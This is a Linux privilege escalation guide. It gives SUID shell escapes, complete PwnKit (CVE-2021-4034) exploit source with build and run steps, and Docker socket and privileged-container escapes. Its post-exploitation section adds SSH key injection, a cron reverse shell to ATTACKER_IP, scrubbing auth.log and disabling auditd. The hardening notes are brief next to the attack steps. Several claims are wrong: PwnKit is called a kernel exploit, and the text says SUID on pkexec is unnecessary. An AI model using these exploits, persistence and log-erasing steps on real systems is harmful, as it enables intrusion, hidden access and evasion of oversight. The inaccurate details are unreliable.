# **Linux Privilege Escalation**

## **Advanced Post-Exploitation Techniques and Real-World Exploits**

Privilege escalation is the process of obtaining elevated access to resources that are normally protected from an attacker. After an initial foothold on a Linux target, elevating privileges to root is essential for full system compromise, persistence, lateral movement, and data exfiltration.

This document focuses on three major vectors:

1. Misconfigured SUID/SGID binaries
2. Kernel vulnerability exploitation (specifically CVE-2021-4034)
3. Container escape techniques via Docker misconfigurations

---

## **1. SUID/SGID Binary Exploitation**

### 1.1 Overview

* **SUID (Set-User-ID)**: Executes a binary with the privileges of the file owner (commonly root).
* **SGID (Set-Group-ID)**: Executes a binary with the privileges of the group owner.
* These permission bits are powerful but often dangerous when set on binaries that were not intended for privilege elevation.

### 1.2 Enumeration

The first step in SUID/SGID exploitation is identifying such binaries:

```bash
# Find all SUID binaries
find / -type f -perm -04000 -exec ls -ld {} \; 2>/dev/null

# Find SGID binaries
find / -type f -perm -02000 -exec ls -ld {} \; 2>/dev/null
```

For thorough post-exploitation enumeration, tools like [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) or [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) can be deployed.

### 1.3 Exploitable SUID Binary Example: `find`

Suppose `find` is discovered with SUID permissions:

```bash
-rwsr-xr-x 1 root root 159432 /usr/bin/find
```

This allows us to execute a command as root:

```bash
find . -exec /bin/sh \; -quit
```

Once executed:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

The attacker now has a root shell.

### 1.4 Exploitable SUID Binary Example: `vim`

If `vim` or `vimdiff` is SUID-root:

```bash
vim -c ':!sh'
# or
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

### 1.5 Defensive Hardening

To remove SUID bits from non-essential binaries:

```bash
chmod u-s /usr/bin/find /usr/bin/vim /usr/bin/nmap
```

To monitor changes to SUID permissions:

```bash
auditctl -w / -p wa -k suid_changes
```

---

## **2. Kernel Exploit: CVE-2021-4034 (PwnKit)**

### 2.1 Vulnerability Overview

* **Vulnerable Component**: `pkexec` (from the `polkit` package)
* **CVE**: 2021-4034 (PwnKit)
* **Severity**: High (CVSS Score 7.8)
* **Impact**: Local privilege escalation to root
* **Cause**: `pkexec` fails to sanitize its environment before executing

The vulnerability is universally exploitable on default Linux configurations and does not require the `pkexec` binary to be SUID-root for success.

### 2.2 Verification of Target

Check for the presence of `pkexec` and its permissions:

```bash
which pkexec && ls -l $(which pkexec)
```

Output should resemble:

```bash
-rwsr-xr-x 1 root root 103432 /usr/bin/pkexec
```

### 2.3 Exploitation Process

#### Step 1: Prepare Exploit Code (Launcher)

```c
#include <unistd.h>

int main(int argc, char **argv) {
    char * const args[] = { NULL };
    char * const envp[] = {
        "pwnkit.so:.",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=/invalid",
        NULL
    };
    execve("/usr/bin/pkexec", args, envp);
}
```

#### Step 2: Prepare Malicious Library

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

#### Step 3: Compile Payload

```bash
gcc exploit.c -o exploit
gcc -shared -fPIC -o pwnkit.so payload.c
```

Ensure a `gconv-modules` file exists (can be empty) in the current directory.

#### Step 4: Execute Exploit

```bash
./exploit
```

Once executed, a root shell is spawned.

### 2.4 Post-Exploitation Cleanup

```bash
rm exploit payload.c pwnkit.so gconv-modules
```

### 2.5 Mitigation Strategies

* **Patch** the system:

```bash
# Ubuntu/Debian
apt update && apt upgrade policykit-1

# CentOS/RHEL
yum update polkit
```

* **Remove SUID** on pkexec if not required:

```bash
chmod 0755 /usr/bin/pkexec
```

* **Audit** pkexec usage:

```bash
auditctl -w /usr/bin/pkexec -p x -k pkexec_abuse
```

---

## **3. Docker Escape Techniques**

### 3.1 Background

While Docker provides isolation, it is not a security boundary. When containers are misconfigured (e.g., started with `--privileged` or granted access to the Docker socket), container escape becomes trivial.

### 3.2 Environment Assessment

#### Check Capabilities:

```bash
capsh --print
```

Presence of `cap_sys_admin` is a red flag.

#### Check if Running as Privileged Container:

```bash
grep CapEff /proc/1/status
```

#### Check Docker Socket Exposure:

```bash
ls -la /var/run/docker.sock
```

### 3.3 Exploitation Techniques

#### Docker Socket Abuse

If the attacker has access to `/var/run/docker.sock`, they can spawn a root-level container with access to the host:

```bash
docker run -v /:/host --rm -it alpine chroot /host
```

This allows direct access to the host file system and root environment.

#### Privileged Container Mount

In a container with elevated privileges and access to the block device:

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

This grants root access to the host system from within the container.

### 3.4 Hardening and Mitigation

* **Drop all capabilities** unless explicitly required:

```bash
docker run --cap-drop=ALL --security-opt no-new-privileges ...
```

* **Avoid `--privileged`** containers unless absolutely necessary.
* **Restrict access** to `/var/run/docker.sock`
* **Use seccomp** and AppArmor/SELinux profiles

Example:

```bash
docker run --security-opt seccomp=/path/to/profile.json ...
```

---

## **4. Post-Exploitation: Persistence and Evasion**

### 4.1 Persistence

**SSH Key Injection** (if root access is obtained):

```bash
mkdir -p /root/.ssh
echo "<attacker_public_key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Cron-based reverse shell:**

```bash
echo "@reboot /bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
```

### 4.2 Log Cleaning

**Remove entries from logs:**

```bash
sed -i '/pkexec/d' /var/log/auth.log
```

**Disable auditing:**

```bash
systemctl stop auditd
systemctl disable auditd
```

---

## **5. Conclusion**

Privilege escalation is a core component of any post-exploitation phase. This guide focused on exploiting commonly misconfigured binaries (SUID/SGID), kernel-level privilege escalation (PwnKit), and container misconfigurations that lead to full host compromise.
